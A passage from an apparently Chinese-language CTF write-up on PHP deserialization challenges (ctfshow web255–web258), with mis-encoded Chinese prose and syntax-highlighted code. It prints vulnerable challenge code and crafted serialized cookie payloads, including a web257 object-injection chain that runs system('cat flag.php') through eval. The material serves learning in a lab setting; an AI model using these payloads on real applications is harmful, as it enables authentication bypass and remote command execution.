punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä¸ä¸Šé¢˜ä¸åŒçš„æ˜¯è¿™æ¬¡çš„<code>$user</code>æ˜¯ç”±cookieçš„userå˜é‡ååºåˆ—åŒ–å¾—åˆ°çš„ï¼Œè€ƒå¯Ÿäº†åŸºæœ¬çš„ååºåˆ—åŒ–</p><p>è¦æ±‚ cookie ä¸­ user å€¼ä¸ºä¸€ä¸ªåºåˆ—åŒ–çš„ ctfshowUser å¯¹è±¡ï¼Œå±æ€§ isVip å€¼ä¸º trueï¼Œusername å’Œ password å’Œ GET å‚æ•°è·å–çš„ä¸€è‡´ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;&#125;</span>å› ä¸ºcookieä¸­å°†"ä½œä¸ºæˆªæ–­ç¬¦å·ï¼Œæ‰€éœ€è¦ç¼–ç ç»•è¿‡ï¼Œè¿™é‡Œé‡‡ç”¨urlç¼–ç </code></pre><h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>**vipOneKeyGetFlag()**æ–¹æ³•è¦æ±‚usernameå’Œpasswordä¸ä¸€æ ·ï¼Œä¼ å…¥çš„ç±»æ˜¯è‡ªå·±å¯æ§çš„ï¼Œæ”¹å°±è¡Œäº†å‘—</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:5:"xxxxx";s:5:"isVip";b:1;&#125;</span></code></pre><h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä»<code>backDoor</code>çš„evalå‡½æ•°å…¥æ‰‹ï¼Œä¿®æ”¹<code>ctfShowUser</code>çš„classå˜é‡è§¦å‘backDoorç±»ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("cat flag.php");'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>backDoor<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A23<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>cat<span class="token operator">+</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:11:"ctfShowUser":4:&#123;s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:1;s:18:"ctfShowUserclass";O:8:"backDoor":1:&#123;s:14:"backDoorcode";s:23:"system("cat flag.php");";&#125;&#125;</span></code></pre><h4 id="web258-ç»•è¿‡æ­£åˆ™"><a href="#web258-ç»•è¿‡æ­£åˆ™" class="headerlink" title="web258(+ç»•è¿‡æ­£åˆ™)"></a>web258(+ç»•è¿‡æ­£åˆ™)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 